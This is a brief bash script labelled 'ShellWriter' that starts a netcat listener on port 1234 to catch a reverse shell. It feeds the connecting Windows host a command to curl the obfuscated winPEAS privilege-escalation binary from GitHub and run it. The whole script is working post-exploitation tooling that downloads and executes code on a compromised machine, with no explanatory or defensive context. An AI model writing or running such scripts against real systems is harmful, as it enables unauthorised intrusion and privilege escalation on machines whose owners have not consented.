#!/bin/bash


echo "----------------------------------------------------------"
figlet -k ShellWriter
echo "----------------------------------------------------------"
echo "**--Starting the listener--**"
echo "curl https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASx64.exe -o winPeas.exe ; .\winPeas.exe systeminfo" | rlwrap nc -lvnp 1234

